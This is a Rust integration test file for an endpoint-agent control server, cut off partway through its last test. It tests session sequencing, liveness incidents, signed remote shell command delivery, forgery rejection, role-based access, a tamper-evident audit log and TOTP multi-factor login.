#[tokio::test]
async fn test_restart_starts_a_fresh_sequence_and_old_sessions_expire() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "restarting-agent").await;

    let body = agent.heartbeat();
    let stale_signature = agent.sign(&body);
    let stale_body = body.clone();
    let (status, _) = post_agent(&app, "/api/events", body, Some(&stale_signature)).await;
    assert_eq!(status, StatusCode::OK);

    for _ in 0..5 {
        agent.restart();
        let body = agent.heartbeat();
        let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
        assert_eq!(status, StatusCode::OK, "a restarted agent begins at seq 1 again");
    }

    let (status, _) = post_agent(&app, "/api/events", stale_body, Some(&stale_signature)).await;
    assert_eq!(status, StatusCode::CONFLICT, "requests from long-gone sessions are stale");

    let retained: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM agent_sessions WHERE agent_id = 'restarting-agent'")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert!(retained <= 4);
}

#[tokio::test]
async fn test_two_live_sessions_do_not_reject_each_other() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut service = enroll(&app, &pool, "upgrading-agent").await;

    let mut staging = TestAgent { id: service.id.clone(), key: service.key.clone(), session: service.session + 1, seq: 0 };

    for _ in 0..3 {
        let body = staging.heartbeat();
        let (status, _) = send_signed(&app, &staging, "/api/events", body).await;
        assert_eq!(status, StatusCode::OK);

        let body = service.heartbeat();
        let (status, _) = send_signed(&app, &service, "/api/events", body).await;
        assert_eq!(status, StatusCode::OK);
    }

    assert!(open_incidents(&pool, "upgrading-agent").await.is_empty());
}

#[tokio::test]
async fn test_service_stop_opens_incident_until_agent_returns() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "stopped-agent").await;

    let body = agent.batch(serde_json::json!([
        { "AgentStopping": { "timestamp": 1640995200, "reason": "ServiceStop" } }
    ]));
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(open_incidents(&pool, "stopped-agent").await, vec!["service_stopped"]);
    assert_eq!(liveness_state(&pool, "stopped-agent").await, "incident");

    agent.restart();
    let body = agent.heartbeat();
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
    assert!(open_incidents(&pool, "stopped-agent").await.is_empty());
    assert_eq!(liveness_state(&pool, "stopped-agent").await, "active");

    let history: Vec<String> = sqlx::query_scalar(
        "SELECT event_type FROM events WHERE agent_id = 'stopped-agent' AND event_type LIKE 'incident_%' ORDER BY rowid"
    )
    .fetch_all(&pool)
    .await
    .unwrap();
    assert_eq!(history, vec!["incident_opened", "incident_closed"]);
}

#[tokio::test]
async fn test_system_shutdown_is_not_an_incident() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "shutdown-agent").await;

    let body = agent.batch(serde_json::json!([
        { "AgentStopping": { "timestamp": 1640995200, "reason": "SystemShutdown" } }
    ]));
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);

    assert!(open_incidents(&pool, "shutdown-agent").await.is_empty());
    assert_eq!(liveness_state(&pool, "shutdown-agent").await, "stopped");

    let (events_tx, _) = tokio::sync::broadcast::channel(16);
    let far_future = chrono::Utc::now().timestamp() + 100_000;
    zedr_control_server::liveness::sweep_once(&pool, &events_tx, far_future, 0).await.unwrap();
    assert!(open_incidents(&pool, "shutdown-agent").await.is_empty());
    assert_eq!(liveness_state(&pool, "shutdown-agent").await, "stopped");
}

#[tokio::test]
async fn test_sweep_flags_only_the_uniquely_silent_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    let _quiet = enroll(&app, &pool, "quiet-agent").await;
    let mut healthy = enroll(&app, &pool, "healthy-agent").await;
    let (events_tx, _) = tokio::sync::broadcast::channel(16);

    let now = chrono::Utc::now().timestamp();
    sqlx::query("UPDATE agents SET last_heartbeat = ? WHERE id = 'quiet-agent'")
        .bind(now - 1000)
        .execute(&pool)
        .await
        .unwrap();
    let body = healthy.heartbeat();
    send_signed(&app, &healthy, "/api/events", body).await;

    zedr_control_server::liveness::sweep_once(&pool, &events_tx, now, 0).await.unwrap();

    assert_eq!(open_incidents(&pool, "quiet-agent").await, vec!["silence"]);
    assert_eq!(liveness_state(&pool, "quiet-agent").await, "incident");
    assert!(open_incidents(&pool, "healthy-agent").await.is_empty());
    assert_eq!(liveness_state(&pool, "healthy-agent").await, "active");

    zedr_control_server::liveness::sweep_once(&pool, &events_tx, now + 15, 0).await.unwrap();
    let silence_incidents: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM incidents WHERE agent_id = 'quiet-agent'")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(silence_incidents, 1, "a continuing silence is one incident, not one per sweep");
}

#[tokio::test]
async fn test_sweep_holds_when_the_whole_fleet_is_silent() {
    let (app, pool) = create_test_app_with_pool().await;
    enroll(&app, &pool, "fleet-a").await;
    enroll(&app, &pool, "fleet-b").await;
    let (events_tx, _) = tokio::sync::broadcast::channel(16);

    let now = chrono::Utc::now().timestamp();
    sqlx::query("UPDATE agents SET last_heartbeat = ?").bind(now - 5000).execute(&pool).await.unwrap();

    zedr_control_server::liveness::sweep_once(&pool, &events_tx, now, 0).await.unwrap();

    for agent_id in ["fleet-a", "fleet-b"] {
        assert!(open_incidents(&pool, agent_id).await.is_empty());
        assert_eq!(liveness_state(&pool, agent_id).await, "suspect");
    }
}

#[tokio::test]
async fn test_sweep_does_not_alarm_for_silence_before_server_start() {
    let (app, pool) = create_test_app_with_pool().await;
    enroll(&app, &pool, "pre-restart-agent").await;
    let (events_tx, _) = tokio::sync::broadcast::channel(16);

    let now = chrono::Utc::now().timestamp();
    sqlx::query("UPDATE agents SET last_heartbeat = ?").bind(now - 50_000).execute(&pool).await.unwrap();

    zedr_control_server::liveness::sweep_once(&pool, &events_tx, now, now - 20).await.unwrap();

    assert!(open_incidents(&pool, "pre-restart-agent").await.is_empty());
    assert_eq!(liveness_state(&pool, "pre-restart-agent").await, "active");
}

#[tokio::test]
async fn test_heartbeat_closes_silence_incident() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "recovering-agent").await;
    let (events_tx, _) = tokio::sync::broadcast::channel(16);

    let now = chrono::Utc::now().timestamp();
    sqlx::query("UPDATE agents SET last_heartbeat = ?").bind(now - 2000).execute(&pool).await.unwrap();
    zedr_control_server::liveness::sweep_once(&pool, &events_tx, now, 0).await.unwrap();
    assert_eq!(open_incidents(&pool, "recovering-agent").await, vec!["silence"]);

    let body = agent.heartbeat();
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
    assert!(open_incidents(&pool, "recovering-agent").await.is_empty());
    assert_eq!(liveness_state(&pool, "recovering-agent").await, "active");
}

#[tokio::test]
async fn test_shell_result_cannot_be_forged_by_another_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut victim = enroll(&app, &pool, "victim-agent").await;
    let mut attacker = enroll(&app, &pool, "attacker-agent").await;

    let now = chrono::Utc::now().timestamp();
    sqlx::query(
        "INSERT INTO shell_sessions (id, agent_id, created_at, last_activity_at, expires_at, created_by_user_id)
         VALUES ('session-1', 'victim-agent', ?, ?, ?, 'user-1')"
    )
    .bind(now).bind(now).bind(now + 1800)
    .execute(&pool).await.unwrap();
    sqlx::query(
        "INSERT INTO shell_commands (id, session_id, command_text, signature, issued_at, nonce)
         VALUES ('command-1', 'session-1', 'whoami', x'00', ?, 'nonce-1')"
    )
    .bind(now)
    .execute(&pool).await.unwrap();

    let forged = serde_json::json!([{
        "ShellCommandExecuted": {
            "timestamp": 1640995200, "session_id": "session-1", "command_id": "nonce-1",
            "exit_code": 0, "stdout": "forged output", "stderr": "", "execution_time_ms": 1
        }
    }]);

    let body = attacker.batch(forged.clone());
    let (status, _) = send_signed(&app, &attacker, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
    let stdout: Option<String> = sqlx::query_scalar("SELECT stdout FROM shell_commands WHERE id = 'command-1'")
        .fetch_one(&pool).await.unwrap();
    assert_eq!(stdout, None, "another agent must not be able to fill in the result");

    let body = victim.batch(forged);
    let (status, _) = send_signed(&app, &victim, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
    let stdout: Option<String> = sqlx::query_scalar("SELECT stdout FROM shell_commands WHERE id = 'command-1'")
        .fetch_one(&pool).await.unwrap();
    assert_eq!(stdout.as_deref(), Some("forged output"));
}

#[tokio::test]
async fn test_first_result_of_a_shell_command_is_kept() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "restarting-agent").await;

    let now = chrono::Utc::now().timestamp();
    sqlx::query(
        "INSERT INTO shell_sessions (id, agent_id, created_at, last_activity_at, expires_at, created_by_user_id)
         VALUES ('session-1', 'restarting-agent', ?, ?, ?, 'user-1')"
    )
    .bind(now).bind(now).bind(now + 1800)
    .execute(&pool).await.unwrap();
    sqlx::query(
        "INSERT INTO shell_commands (id, session_id, command_text, signature, issued_at, nonce)
         VALUES ('command-1', 'session-1', 'whoami', x'00', ?, 'nonce-1')"
    )
    .bind(now)
    .execute(&pool).await.unwrap();

    let result = |timestamp: i64, exit_code: i32, stdout: &str, stderr: &str| {
        serde_json::json!([{
            "ShellCommandExecuted": {
                "timestamp": timestamp, "session_id": "session-1", "command_id": "nonce-1",
                "exit_code": exit_code, "stdout": stdout, "stderr": stderr, "execution_time_ms": 1
            }
        }])
    };
    let stored = || async {
        sqlx::query_as::<_, (Option<i64>, Option<i32>, Option<String>, Option<String>)>(
            "SELECT executed_at, exit_code, stdout, stderr FROM shell_commands WHERE id = 'command-1'"
        )
        .fetch_one(&pool).await.unwrap()
    };

    let body = agent.batch(result(1640995200, 0, "zedr\\operator\n", ""));
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
    let first = (Some(1640995200), Some(0), Some("zedr\\operator\n".to_string()), Some(String::new()));
    assert_eq!(stored().await, first);

    let restart_note = "[AGENT RESTARTED BEFORE THE RESULT WAS SENT, THE COMMAND MAY NOT HAVE FINISHED]";
    let body = agent.batch(result(1640995260, -1, "", restart_note));
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK, "the agent is not asked to send it again");
    assert_eq!(stored().await, first, "a later result does not take the place of the one that arrived first");

    let arrivals: i64 = sqlx::query_scalar(
        "SELECT COUNT(*) FROM events WHERE agent_id = 'restarting-agent' AND event_type = 'shell_command_executed'"
    )
    .fetch_one(&pool).await.unwrap();
    assert_eq!(arrivals, 2, "both arrivals stay in the event list");
}

async fn queue_shell_commands(pool: &SqlitePool, agent_id: &str, nonces: &[&str]) {
    let now = chrono::Utc::now().timestamp();
    sqlx::query(
        "INSERT INTO shell_sessions (id, agent_id, created_at, last_activity_at, expires_at, created_by_user_id)
         VALUES ('session-1', ?, ?, ?, ?, 'user-1')"
    )
    .bind(agent_id).bind(now).bind(now).bind(now + 1800)
    .execute(pool).await.unwrap();

    for (position, nonce) in nonces.iter().enumerate() {
        sqlx::query(
            "INSERT INTO shell_commands (id, session_id, command_text, signature, issued_at, nonce)
             VALUES (?, 'session-1', 'whoami', x'00', ?, ?)"
        )
        .bind(format!("command-of-{}", nonce)).bind(now + position as i64).bind(nonce)
        .execute(pool).await.unwrap();
    }
}

async fn handed_out(app: &axum::Router, agent: &mut TestAgent) -> (Option<String>, Option<String>) {
    let body = agent.heartbeat();
    let (status, json) = send_signed(app, agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);
    let nonce_of = |command: &str| json[command]["nonce"].as_str().map(str::to_string);
    (nonce_of("upgrade"), nonce_of("shell_command"))
}

async fn let_time_pass_since_hand_out(pool: &SqlitePool, table: &str, seconds: i64) {
    sqlx::query(&format!("UPDATE {} SET handed_out_at = handed_out_at - ? WHERE handed_out_at IS NOT NULL", table))
        .bind(seconds)
        .execute(pool).await.unwrap();
}

#[tokio::test]
async fn test_unanswered_shell_command_is_handed_out_again_only_after_a_wait() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "waiting-agent").await;
    queue_shell_commands(&pool, "waiting-agent", &["nonce-1", "nonce-2"]).await;

    assert_eq!(handed_out(&app, &mut agent).await, (None, Some("nonce-1".to_string())));
    assert_eq!(handed_out(&app, &mut agent).await, (None, None), "neither the same command nor the one behind it");

    let_time_pass_since_hand_out(&pool, "shell_commands", 118).await;
    assert_eq!(handed_out(&app, &mut agent).await, (None, None), "two minutes have not passed");

    let_time_pass_since_hand_out(&pool, "shell_commands", 2).await;
    assert_eq!(handed_out(&app, &mut agent).await, (None, Some("nonce-1".to_string())), "the answer to the first hand-out may have been lost");
    assert_eq!(handed_out(&app, &mut agent).await, (None, None), "the wait starts again");

    let result = serde_json::json!([{
        "ShellCommandExecuted": {
            "timestamp": 1640995200, "session_id": "session-1", "command_id": "nonce-1",
            "exit_code": 0, "stdout": "", "stderr": "", "execution_time_ms": 1
        }
    }]);
    let body = agent.batch(result);
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);

    assert_eq!(handed_out(&app, &mut agent).await, (None, Some("nonce-2".to_string())), "the next command goes out once the one before it has an answer");
}

#[tokio::test]
async fn test_pending_upgrade_is_handed_out_again_only_after_a_wait_and_holds_shell_commands_back() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "upgrading-agent").await;
    queue_shell_commands(&pool, "upgrading-agent", &["nonce-1"]).await;
    let now = chrono::Utc::now().timestamp();
    sqlx::query(
        "INSERT INTO upgrade_commands (id, agent_id, target_version, status, created_at, signature, issued_at, nonce)
         VALUES ('upgrade-1', 'upgrading-agent', '0.2.0', 'pending', ?, x'00', ?, 'upgrade-nonce-1')"
    )
    .bind(now).bind(now)
    .execute(&pool).await.unwrap();

    assert_eq!(handed_out(&app, &mut agent).await, (Some("upgrade-nonce-1".to_string()), None));
    assert_eq!(handed_out(&app, &mut agent).await, (None, None), "no shell command while the upgrade has no answer");

    let_time_pass_since_hand_out(&pool, "upgrade_commands", 118).await;
    assert_eq!(handed_out(&app, &mut agent).await, (None, None), "two minutes have not passed");

    let_time_pass_since_hand_out(&pool, "upgrade_commands", 2).await;
    assert_eq!(handed_out(&app, &mut agent).await, (Some("upgrade-nonce-1".to_string()), None));

    let refused = serde_json::json!([{
        "Upgrade": {
            "timestamp": 1640995200, "from_version": "0.1.0", "to_version": "0.2.0",
            "status": "Failed", "error": "The Linux agent does not upgrade itself, run the installer again"
        }
    }]);
    let body = agent.batch(refused);
    let (status, _) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);

    assert_eq!(handed_out(&app, &mut agent).await, (None, Some("nonce-1".to_string())), "the shell command goes out once the upgrade has an answer");
}

#[tokio::test]
async fn test_delivered_shell_command_is_signed_for_its_agent() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "commanded-agent").await;
    let token = admin_token("admin");

    let response = app.clone().oneshot(
        Request::builder().method("POST").uri("/api/admin/shell-sessions")
            .header("content-type", "application/json")
            .header("authorization", format!("Bearer {}", token))
            .body(Body::from(r#"{"agent_id":"commanded-agent"}"#)).unwrap(),
    ).await.unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    let session: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
    let session_id = session["session_id"].as_str().unwrap().to_string();

    let response = app.clone().oneshot(
        Request::builder().method("POST").uri(format!("/api/admin/shell-sessions/{}/commands", session_id))
            .header("content-type", "application/json")
            .header("authorization", format!("Bearer {}", token))
            .body(Body::from(r#"{"command_text":"Write-Output \"hi\""}"#)).unwrap(),
    ).await.unwrap();
    assert_eq!(response.status(), StatusCode::OK);

    let body = agent.heartbeat();
    let (status, json) = send_signed(&app, &agent, "/api/events", body).await;
    assert_eq!(status, StatusCode::OK);

    let command = &json["shell_command"];
    assert_eq!(command["agent_id"], "commanded-agent");
    assert_eq!(command["session_id"], session_id.as_str());

    let signature_bytes: Vec<u8> = command["signature"].as_array().unwrap().iter().map(|b| b.as_u64().unwrap() as u8).collect();
    let signature = ed25519_dalek::Signature::from_slice(&signature_bytes).unwrap();
    let seed: [u8; 32] = hex::decode(TEST_SIGNING_KEY_HEX).unwrap().try_into().unwrap();
    let server_key = SigningKey::from_bytes(&seed).verifying_key();

    let signed_for = |agent_id: &str| zedr_protocol::shell_command_signing_bytes(
        agent_id,
        &session_id,
        command["command_text"].as_str().unwrap(),
        command["nonce"].as_str().unwrap(),
        command["issued_at"].as_u64().unwrap(),
    ).unwrap();

    assert!(server_key.verify(&signed_for("commanded-agent"), &signature).is_ok());
    assert!(server_key.verify(&signed_for("some-other-agent"), &signature).is_err());
}

#[tokio::test]
async fn test_install_key_list_shows_which_agent_enrolled_with_it() {
    let (app, pool) = create_test_app_with_pool().await;
    let token = admin_token("admin");
    enroll(&app, &pool, "listed-agent").await;
    insert_install_key(&pool, "zedr_never_used", 3600).await;

    let (status, json) = call(&app, "GET", "/api/admin/installers", Some(&token), None).await;
    assert_eq!(status, StatusCode::OK);

    let keys = json["keys"].as_array().unwrap();
    let enrolled = keys.iter().find(|key| key["enrolled_agent_id"] == "listed-agent").expect("enrolled key is listed");
    assert!(enrolled["enrolled_at"].as_i64().unwrap() > 0);

    let unused = keys.iter().find(|key| key["id"] == "id-zedr_never_used").unwrap();
    assert!(unused["enrolled_at"].is_null());
    assert!(unused["enrolled_agent_id"].is_null());
}

#[tokio::test]
async fn test_install_keys_are_never_stored_in_plaintext() {
    let (app, pool) = create_test_app_with_pool().await;
    let token = admin_token("admin");

    let response = app.clone().oneshot(
        Request::builder().method("POST").uri("/api/admin/installers/generate")
            .header("content-type", "application/json")
            .header("authorization", format!("Bearer {}", token))
            .body(Body::from("{}")).unwrap(),
    ).await.unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    let generated: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
    let plaintext = generated["install_key"].as_str().unwrap();

    let columns: Vec<String> = sqlx::query_scalar("SELECT name FROM pragma_table_info('install_keys')")
        .fetch_all(&pool).await.unwrap();
    assert!(!columns.contains(&"key_plaintext".to_string()));

    let dump: Vec<String> = sqlx::query_scalar(
        "SELECT id || key_hash || created_by || agent_version FROM install_keys"
    ).fetch_all(&pool).await.unwrap();
    assert!(dump.iter().all(|row| !row.contains(plaintext)));
}

#[tokio::test]
async fn test_incidents_endpoint_requires_auth_and_lists_incidents() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut agent = enroll(&app, &pool, "listed-agent").await;
    let body = agent.batch(serde_json::json!([
        { "AgentStopping": { "timestamp": 1640995200, "reason": "ServiceStop" } }
    ]));
    send_signed(&app, &agent, "/api/events", body).await;

    let response = app.clone().oneshot(
        Request::builder().uri("/api/admin/incidents?open=true").body(Body::empty()).unwrap(),
    ).await.unwrap();
    assert_eq!(response.status(), StatusCode::UNAUTHORIZED);

    let response = app.clone().oneshot(
        Request::builder().uri("/api/admin/incidents?open=true")
            .header("authorization", format!("Bearer {}", admin_token("admin")))
            .body(Body::empty()).unwrap(),
    ).await.unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    let incidents: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
    assert_eq!(incidents.as_array().unwrap().len(), 1);
    assert_eq!(incidents[0]["incident_type"], "service_stopped");
    assert_eq!(incidents[0]["agent_id"], "listed-agent");
}

async fn call(
    app: &axum::Router,
    method: &str,
    uri: &str,
    token: Option<&str>,
    body: Option<serde_json::Value>,
) -> (StatusCode, serde_json::Value) {
    let mut request = Request::builder().method(method).uri(uri);
    if let Some(token) = token {
        request = request.header("authorization", format!("Bearer {}", token));
    }
    let request = match body {
        Some(body) => request
            .header("content-type", "application/json")
            .body(Body::from(body.to_string()))
            .unwrap(),
        None => request.body(Body::empty()).unwrap(),
    };

    let response = app.clone().oneshot(request).await.unwrap();
    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), usize::MAX).await.unwrap();
    (status, serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null))
}

async fn insert_user(pool: &SqlitePool, id: &str, username: &str, password: &str, role: &str) {
    sqlx::query("INSERT INTO users (id, username, password_hash, role, created_at) VALUES (?, ?, ?, ?, ?)")
        .bind(id)
        .bind(username)
        .bind(zedr_control_server::auth::hash_password(password).unwrap())
        .bind(role)
        .bind(chrono::Utc::now().timestamp())
        .execute(pool)
        .await
        .unwrap();
}

fn totp_step_now() -> u64 {
    chrono::Utc::now().timestamp() as u64 / 30
}

#[tokio::test]
async fn test_user_role_is_read_only() {
    let (app, pool) = create_test_app_with_pool().await;
    enroll(&app, &pool, "rbac-agent").await;
    let user = admin_token("user");

    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&user), None).await;
    assert_eq!(status, StatusCode::OK);
    let (status, _) = call(&app, "GET", "/api/admin/incidents", Some(&user), None).await;
    assert_eq!(status, StatusCode::OK);

    let forbidden = [
        ("POST", "/api/admin/installers/generate", Some(serde_json::json!({}))),
        ("POST", "/api/admin/shell-sessions", Some(serde_json::json!({ "agent_id": "rbac-agent" }))),
        ("POST", "/api/admin/shell-sessions/any/commands", Some(serde_json::json!({ "command_text": "whoami" }))),
        ("GET", "/api/admin/shell-sessions/any/commands", None),
        ("DELETE", "/api/admin/shell-sessions/any", None),
        ("POST", "/api/admin/upgrades", Some(serde_json::json!({ "agent_id": "rbac-agent", "install_key_id": "k", "target_version": "0.2.0" }))),
        ("GET", "/api/admin/users", None),
        ("POST", "/api/admin/users", Some(serde_json::json!({ "username": "x", "password": "Str0ng!Passw0rd", "role": "admin" }))),
        ("DELETE", "/api/admin/users/any", None),
        ("GET", "/api/admin/audit", None),
    ];

    for (method, uri, body) in forbidden {
        let (status, _) = call(&app, method, uri, Some(&user), body).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{} {} must need the admin role", method, uri);
    }

    let sessions: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM shell_sessions").fetch_one(&pool).await.unwrap();
    assert_eq!(sessions, 0);
}

#[tokio::test]
async fn test_admin_actions_are_audited_in_a_verifiable_chain() {
    let (app, pool) = create_test_app_with_pool().await;
    enroll(&app, &pool, "audited-agent").await;
    let admin = admin_token("admin");

    call(&app, "POST", "/api/admin/installers/generate", Some(&admin), Some(serde_json::json!({}))).await;
    let (_, session) = call(&app, "POST", "/api/admin/shell-sessions", Some(&admin), Some(serde_json::json!({ "agent_id": "audited-agent" }))).await;
    let session_id = session["session_id"].as_str().unwrap();
    call(&app, "POST", &format!("/api/admin/shell-sessions/{}/commands", session_id), Some(&admin), Some(serde_json::json!({ "command_text": "whoami" }))).await;
    call(&app, "DELETE", &format!("/api/admin/shell-sessions/{}", session_id), Some(&admin), None).await;

    let (status, audit) = call(&app, "GET", "/api/admin/audit", Some(&admin), None).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(audit["chain_intact"], true);

    let actions: Vec<&str> = audit["entries"].as_array().unwrap().iter().map(|e| e["action"].as_str().unwrap()).collect();
    assert_eq!(actions, vec!["shell.session.terminate", "shell.command", "shell.session.create", "install_key.generate"]);
    assert!(audit["entries"].as_array().unwrap().iter().all(|e| e["actor"] == "tester"));
    assert!(audit["entries"][1]["detail"].as_str().unwrap().contains("whoami"));

    sqlx::query("UPDATE audit_log SET detail = '{\"command_text\":\"harmless\"}' WHERE action = 'shell.command'")
        .execute(&pool)
        .await
        .unwrap();
    let (_, audit) = call(&app, "GET", "/api/admin/audit", Some(&admin), None).await;
    assert_eq!(audit["chain_intact"], false);
    assert_eq!(audit["first_broken_seq"], 3);
}

#[tokio::test]
async fn test_deleting_an_audit_row_breaks_the_chain() {
    let (app, pool) = create_test_app_with_pool().await;
    let admin = admin_token("admin");

    for _ in 0..3 {
        call(&app, "POST", "/api/admin/installers/generate", Some(&admin), Some(serde_json::json!({}))).await;
    }
    sqlx::query("DELETE FROM audit_log WHERE seq = 2").execute(&pool).await.unwrap();

    let (_, audit) = call(&app, "GET", "/api/admin/audit", Some(&admin), None).await;
    assert_eq!(audit["chain_intact"], false);
    assert_eq!(audit["first_broken_seq"], 3);
}

#[tokio::test]
async fn test_logins_are_audited() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-login", "operator", "Correct-Horse-9", "admin").await;

    let (status, _) = call(&app, "POST", "/api/auth/login", None, Some(serde_json::json!({ "username": "operator", "password": "wrong" }))).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, _) = call(&app, "POST", "/api/auth/login", None, Some(serde_json::json!({ "username": "nobody", "password": "wrong" }))).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    let (status, login) = call(&app, "POST", "/api/auth/login", None, Some(serde_json::json!({ "username": "operator", "password": "Correct-Horse-9" }))).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(login["mfa_required"], false);
    assert!(login["token"].is_string());

    let actions: Vec<(String, String)> = sqlx::query_as("SELECT actor, action FROM audit_log ORDER BY seq")
        .fetch_all(&pool)
        .await
        .unwrap();
    assert_eq!(actions, vec![
        ("operator".to_string(), "login.failed".to_string()),
        ("nobody".to_string(), "login.failed".to_string()),
        ("operator".to_string(), "login".to_string()),
    ]);
}

#[tokio::test]
async fn test_mfa_enrolment_and_second_factor_login() {
    let (app, pool) = create_test_app_with_pool().await;
    insert_user(&pool, "u-mfa", "analyst", "Correct-Horse-9", "admin").await;
    let credentials = serde_json::json!({ "username": "analyst", "password": "Correct-Horse-9" });

    let (_, login) = call(&app, "POST", "/api/auth/login", None, Some(credentials.clone())).await;
    let token = login["token"].as_str().unwrap().to_string();

    let (status, setup) = call(&app, "POST", "/api/auth/mfa/setup", Some(&token), None).await;
    assert_eq!(status, StatusCode::OK);
    assert!(setup["provisioning_uri"].as_str().unwrap().starts_with("otpauth://totp/zedr:analyst?secret="));

    let secret_hex: String = sqlx::query_scalar("SELECT mfa_secret FROM users WHERE id = 'u-mfa'").fetch_one(&pool).await.unwrap();
    let secret = hex::decode(secret_hex).unwrap();
    assert_eq!(setup["secret"], zedr_control_server::mfa::base32_encode(&secret));

    let (status, _) = call(&app, "POST", "/api/auth/mfa/enable", Some(&token), Some(serde_json::json!({ "code": "000000" }))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    let (_, still_single) = call(&app, "POST", "/api/auth/login", None, Some(credentials.clone())).await;
    assert_eq!(still_single["mfa_required"], false, "a pending setup must not lock the account");

    let enable_code = zedr_control_server::mfa::code_at_step(&secret, totp_step_now());
    let (status, enabled) = call(&app, "POST", "/api/auth/mfa/enable", Some(&token), Some(serde_json::json!({ "code": enable_code }))).await;
    assert_eq!(status, StatusCode::OK);
    let recovery_codes: Vec<String> = enabled["recovery_codes"].as_array().unwrap().iter().map(|c| c.as_str().unwrap().to_string()).collect();
    assert_eq!(recovery_codes.len(), 10);

    let (status, challenge) = call(&app, "POST", "/api/auth/login", None, Some(credentials.clone())).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(challenge["mfa_required"], true);
    assert!(challenge["token"].is_null(), "no access token before the second factor");
    let mfa_token = challenge["mfa_token"].as_str().unwrap().to_string();

    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&mfa_token), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "a challenge token is not an access token");

    let (status, _) = call(&app, "POST", "/api/auth/login/mfa", None, Some(serde_json::json!({ "mfa_token": mfa_token, "code": enable_code }))).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "a code that was already used is rejected");

    let (status, _) = call(&app, "POST", "/api/auth/login/mfa", None, Some(serde_json::json!({ "mfa_token": token, "code": "123456" }))).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "an access token is not a challenge token");

    let fresh_code = zedr_control_server::mfa::code_at_step(&secret, totp_step_now() + 1);
    let (status, session) = call(&app, "POST", "/api/auth/login/mfa", None, Some(serde_json::json!({ "mfa_token": mfa_token, "code": fresh_code }))).await;
    assert_eq!(status, StatusCode::OK);
    let access = session["token"].as_str().unwrap().to_string();
    let (status, _) = call(&app, "GET", "/api/admin/agents", Some(&access), None).await;
    assert_eq!(status, StatusCode::OK);

    let (_, challenge) = call(&app, "POST", "/api/auth/login", None, Some(credentials.clone())).await;
    let mfa_token = challenge["mfa_token"].as_str().unwrap().to_string();
    let recovery = serde_json::json!({ "mfa_token": mfa_token, "code": recovery_codes[0] });
    let (status, _) = call(&app, "POST", "/api/auth/login/mfa", None, Some(recovery.clone())).await;
    assert_eq!(status, StatusCode::OK);
    let (status, _) = call(&app, "POST", "/api/auth/login/mfa", None, Some(recovery)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "a recovery code works once");

    let (status, _) = call(&app, "POST", "/api/auth/mfa/disable", Some(&access), Some(serde_json::json!({ "code": recovery_codes[1] }))).await;
    assert_eq!(status, StatusCode::OK);
    let (_, login) = call(&app, "POST", "/api/auth/login", None, Some(credentials)).await;
    assert_eq!(login["mfa_required"], false);

    let stored_plain: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM mfa_recovery_codes WHERE code_hash = ?")
        .bind(&recovery_codes[2])
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(stored_plain, 0, "recovery codes are stored hashed");
}

#[tokio::test]
async fn test_user_management_rules() {
    let app = create_test_app().await;
    let admin = admin_token("admin");

